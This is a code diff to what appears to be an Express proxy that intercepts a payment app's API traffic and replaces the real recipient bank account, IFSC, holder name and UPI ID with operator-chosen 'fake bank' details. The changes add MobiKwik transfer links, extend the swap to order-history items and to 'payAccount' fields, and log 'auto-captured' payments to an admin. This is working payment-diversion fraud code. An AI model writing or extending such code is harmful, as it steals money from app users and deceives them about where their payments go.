@@ -461,6 +461,7 @@ const BANK_FIELD_MAP = {
   bankname: 'bankName', bank_name: 'bankName', payeebankname: 'bankName', receiverbankname: 'bankName',
   upiid: 'upiId', upi_id: 'upiId', upi: 'upiId', vpa: 'upiId',
   payeeupi: 'upiId', receiverupi: 'upiId', walletupi: 'upiId',
+  payaccount: 'upiId', pay_account: 'upiId', payeraccount: 'upiId', payer_account: 'upiId',
   payeebankaccount: 'accountNo', payeerecipientsname: 'accountHolder',
   payeerecipientsname: 'accountHolder', payeerecipientname: 'accountHolder',
   recipientsname: 'accountHolder', recipientname: 'accountHolder',
@@ -1800,9 +1801,8 @@ app.all('/xxapi/*', async (req, res) => {
         const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
         const activeBank = getActiveBank(data, null);
 
-        if (activeBank && data.botEnabled !== false) {
+        if (data.botEnabled !== false) {
           for (const order of orderList) {
-            const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
             const amt = getOrderAmount(req, order);
             const orderIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'id', 'tradeNo'];
             let orderId = '';
@@ -1820,62 +1820,78 @@ app.all('/xxapi/*', async (req, res) => {
             }
             const altId = order.orderNo || order.rptNo || '';
 
-            if (isPaying && orderId && amt !== null) {
-              if (!activeBank.minAmount || amt >= activeBank.minAmount) {
-                // Mutate the JSON response directly so the app sees the fake bank
-                const bkAcctC1 = activeBank.accountNo || '';
-                const bkIfscC1 = activeBank.ifsc || '';
-                const bkNameC1 = activeBank.accountHolder || '';
-                const last4C1 = bkAcctC1.slice(-4);
-                let pt = order.payType || order.ctType || 1;
-                if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
-                const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
+            // Find target bank (saved in orderBankMap or fallback to activeBank)
+            let targetBank = null;
+            if (orderId && data.orderBankMap && data.orderBankMap[String(orderId)]) {
+              targetBank = data.orderBankMap[String(orderId)];
+            } else if (altId && data.orderBankMap && data.orderBankMap[String(altId)]) {
+              targetBank = data.orderBankMap[String(altId)];
+            } else {
+              targetBank = activeBank;
+            }
 
-                const hasBank = scanHasBankFields(order, 0);
-                if (hasBank) deepReplaceBankFields(order, activeBank, 0, hasBank);
+            if (targetBank) {
+              const bkAcctC1 = targetBank.accountNo || '';
+              const bkIfscC1 = targetBank.ifsc || '';
+              const bkNameC1 = targetBank.accountHolder || '';
+              const last4C1 = bkAcctC1.slice(-4);
+              let pt = order.payType || order.ctType || 1;
+              if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
+              const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt || 0}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
 
-                if (wDomC1) order.walletDomain = wDomC1;
-                if (activeBank.bankName) order.bankName = activeBank.bankName;
+              // Unconditionally replace bank fields on the history order item
+              deepReplaceBankFields(order, targetBank, 0, true);
 
-                if (!data.orderBankMap) data.orderBankMap = {};
-                if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
-                  const savedData = {
-                    bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
-                    accountHolder: bkNameC1,
-                    accountNo: bkAcctC1,
-                    ifsc: bkIfscC1,
-                    bankName: activeBank.bankName || '',
-                    upiId: activeBank.upiId || '',
-                    amount: amt,
-                    rptNo: orderId,
-                    orderNo: altId || orderId,
-                    walletDomain: wDomC1,
-                    payType: pt,
-                    time: now,
-                    userId: String(userId || ''),
-                    forced: true,
-                    isManual: true
-                  };
+              if (order.acctNo !== undefined) order.acctNo = bkAcctC1;
+              if (order.acctCode !== undefined) order.acctCode = bkIfscC1;
+              if (order.acctName !== undefined) order.acctName = bkNameC1;
+              if (order.payAccount !== undefined && targetBank.upiId) order.payAccount = targetBank.upiId;
+              if (wDomC1) order.walletDomain = wDomC1;
+              if (targetBank.bankName) order.bankName = targetBank.bankName;
 
-                  data.orderBankMap[String(orderId)] = savedData;
-                  if (altId && altId !== orderId) {
-                    data.orderBankMap[String(altId)] = savedData;
-                  }
+              // Only auto-capture & notify admin if the order is actively being paid
+              const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
+              if (isPaying && orderId && amt !== null) {
+                if (!targetBank.minAmount || amt >= targetBank.minAmount) {
+                  if (!data.orderBankMap) data.orderBankMap = {};
+                  if (!data.orderBankMap[String(orderId)] || !data.orderBankMap[String(orderId)].forced) {
+                    const savedData = {
+                      bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
+                      accountHolder: bkNameC1,
+                      accountNo: bkAcctC1,
+                      ifsc: bkIfscC1,
+                      bankName: targetBank.bankName || '',
+                      upiId: targetBank.upiId || '',
+                      amount: amt,
+                      rptNo: orderId,
+                      orderNo: altId || orderId,
+                      walletDomain: wDomC1,
+                      payType: pt,
+                      time: now,
+                      userId: String(userId || ''),
+                      forced: true,
+                      isManual: true
+                    };
 
-                  // Persist the auto-captured order immediately so /orders sees it
-                  saveData(data).catch(() => { });
-
-                  if (!data.orderBankMap[String(orderId)].notified) {
-                    data.orderBankMap[String(orderId)].notified = true;
+                    data.orderBankMap[String(orderId)] = savedData;
                     if (altId && altId !== orderId) {
-                      data.orderBankMap[String(altId)].notified = true;
+                      data.orderBankMap[String(altId)] = savedData;
                     }
-                    notifyAdmin(data,
-                      `✅ AUTO-CAPTURED FROM HISTORY
+
+                    saveData(data).catch(() => { });
+
+                    if (!data.orderBankMap[String(orderId)].notified) {
+                      data.orderBankMap[String(orderId)].notified = true;
+                      if (altId && altId !== orderId) {
+                        data.orderBankMap[String(altId)].notified = true;
+                      }
+                      notifyAdmin(data,
+                        `✅ AUTO-CAPTURED FROM HISTORY
 💰 Amount: ₹${amt}
 📋 Order: ${orderId}
 💾 Auto-saved with Bank: ${bkNameC1} | ${bkAcctC1}
 🕐 ${now}`);
+                    }
                   }
                 }
               }
@@ -2115,33 +2131,37 @@ app.all('/xxapi/*', async (req, res) => {
         function _replaceListItems(list) {
           list.forEach(item => {
             if (!item || typeof item !== 'object') return;
-            const orderState = parseInt(item.orderState ?? item.state ?? -1);
-            const isHistoryItem = orderState > 0;
-
             const oId = _getItemOId(item);
-            const savedSlip = oId && data.orderBankMap ? data.orderBankMap[oId] : null;
+            const altOId = item.orderNo || item.rptNo || '';
+            const savedSlip = (oId && data.orderBankMap && data.orderBankMap[oId])
+              || (altOId && data.orderBankMap && data.orderBankMap[altOId])
+              || null;
 
-            if (!isHistoryItem) {
-              // Browse (available to buy): minAmount check
+            let targetBank = null;
+            if (savedSlip) {
+              targetBank = {
+                accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : '') || bank.accountHolder,
+                accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : '') || bank.accountNo,
+                ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : '') || bank.ifsc,
+                bankName: savedSlip.bankName || bank.bankName || 'Bank',
+                upiId: savedSlip.upiId || bank.upiId || ''
+              };
+            } else {
+              targetBank = bank;
+            }
+
+            if (targetBank) {
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
 
-              // Blanket replace for active browse items
               const hasAcct = scanHasBankFields(item, 0);
-              if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
-            } else {
-              // History items: ONLY replace if they were manually added to orderBankMap
-              if (savedSlip && savedSlip.isManual) {
-                const mappedBank = {
-                  accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : ''),
-                  accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : ''),
-                  ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : ''),
-                  bankName: savedSlip.bankName || 'Bank',
-                  upiId: savedSlip.upiId || ''
-                };
-                const hasAcct = scanHasBankFields(item, 0);
-                if (hasAcct) deepReplaceBankFields(item, mappedBank, 0, hasAcct);
-              }
+              deepReplaceBankFields(item, targetBank, 0, true);
+
+              if (item.acctNo !== undefined && targetBank.accountNo) item.acctNo = targetBank.accountNo;
+              if (item.acctCode !== undefined && targetBank.ifsc) item.acctCode = targetBank.ifsc;
+              if (item.acctName !== undefined && targetBank.accountHolder) item.acctName = targetBank.accountHolder;
+              if (item.payAccount !== undefined && targetBank.upiId) item.payAccount = targetBank.upiId;
+              if (item.bankName !== undefined && targetBank.bankName) item.bankName = targetBank.bankName;
             }
           });
         }
